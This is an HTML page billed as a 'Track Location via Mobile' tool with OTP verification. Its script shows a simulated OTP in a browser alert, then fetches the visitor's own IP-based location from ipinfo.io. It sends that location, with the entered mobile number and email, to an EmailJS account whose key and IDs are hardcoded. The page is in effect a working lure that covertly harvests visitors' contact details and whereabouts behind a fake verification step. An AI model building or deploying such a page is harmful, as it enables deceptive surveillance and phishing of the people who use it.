<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Email, Mobile & OTP Verification</title>
<style>
    body {
        font-family: 'Arial', sans-serif;
        background: linear-gradient(to right, #ff7e5f, #feb47b);
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }
    h1 { text-align: center; font-size: 2.5em; color: #fff; text-shadow: 2px 2px 10px rgba(0,0,0,0.3); }
    .container {
        max-width: 600px;
        background-color: #fff;
        padding: 30px;
        border-radius: 10px;
        box-shadow: 0 5px 20px rgba(0,0,0,0.1);
        width: 100%;
    }
    .container h2 { color: #333; font-size: 1.5em; margin-bottom: 20px; }
    label { font-size: 1.2em; color: #444; margin-bottom: 5px; display: block; }
    input[type="text"], input[type="email"], input[type="number"], input[type="tel"] {
        width: 100%;
        padding: 15px;
        margin: 10px 0;
        font-size: 16px;
        border: 2px solid #ddd;
        border-radius: 8px;
        box-sizing: border-box;
        transition: border-color 0.3s ease;
    }
    input:focus { border-color: #4CAF50; outline: none; }
    input::placeholder { color: #888; }
    button {
        width: 100%;
        padding: 15px;
        font-size: 18px;
        background-color: #4CAF50;
        color: white;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }
    button:hover { background-color: #45a049; }

    /* Popup styles */
    .popup {
        display: none;
        position: fixed;
        left: 0; top: 0;
        width: 100%; height: 100%;
        background-color: rgba(0,0,0,0.5);
        justify-content: center;
        align-items: center;
    }
    .popup-content {
        background-color: white;
        padding: 30px;
        border-radius: 10px;
        max-width: 400px;
        width: 100%;
        text-align: center;
    }
</style>
</head>
<body>

<div class="container">
    <h1>Track Location via Mobile</h1>
    <h2>Enter your mobile to start</h2>
    <label for="mobileInput">Mobile Number:</label>
    <input type="tel" id="mobileInput" placeholder="Enter mobile number..." required>
    <button onclick="openOtpPopup()">Next</button>
</div>

<!-- OTP & Email Popup -->
<div class="popup" id="otpPopup">
    <div class="popup-content">
        <h2>OTP Verification & Email</h2>
        <label for="emailInput">Email Address:</label>
        <input type="email" id="emailInput" placeholder="Enter your email here..." required>
        <label for="otpInput">Enter OTP:</label>
        <input type="number" id="otpInput" placeholder="Enter OTP sent to mobile" required>
        <button onclick="verifyOtp()">Verify & Send Location</button>
    </div>
</div>

<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
    emailjs.init('A393kpI6fAN-9v3kk'); // Replace with your EmailJS User ID

    let generatedOtp = null;

    // Open OTP popup
    function openOtpPopup() {
        const mobile = document.getElementById('mobileInput').value;
        if (!mobile) {
            alert("Please enter your mobile number.");
            return;
        }
        // Simulate sending OTP
        generatedOtp = Math.floor(100000 + Math.random() * 900000); // 6-digit OTP
        console.log("OTP sent:", generatedOtp); // For testing purposes
        alert(`Simulated OTP sent to ${mobile}: ${generatedOtp}`);
        document.getElementById('otpPopup').style.display = 'flex';
    }

    function verifyOtp() {
        const otp = document.getElementById('otpInput').value;
        const email = document.getElementById('emailInput').value;
        const mobile = document.getElementById('mobileInput').value;

        if (!email || !otp) {
            alert("Please enter both email and OTP.");
            return;
        }

        if (parseInt(otp) !== generatedOtp) {
            alert("Incorrect OTP. Please try again.");
            return;
        }

        // Fetch location (simulated via IP)
        fetch(`https://ipinfo.io/json`)
            .then(res => res.json())
            .then(data => {
                const locationData = {
                    email, mobile, location: data.loc
                };

                const templateParams = {
                    email: email,
                    mobile: mobile,
                    location: data.loc,
                    message: `Mobile: ${mobile}, Location: ${data.loc}`
                };

                emailjs.send('service_1hk2wrm', 'template_gal92lf', templateParams)
                    .then(() => {
                        alert('Location and email sent successfully!');
                        document.getElementById('otpPopup').style.display = 'none';
                    }, (err) => {
                        console.error(err);
                        alert('Error sending email.');
                    });
            })
            .catch(err => {
                console.error(err);
                alert('Error fetching location.');
            });
    }
</script>

</body>
</html>
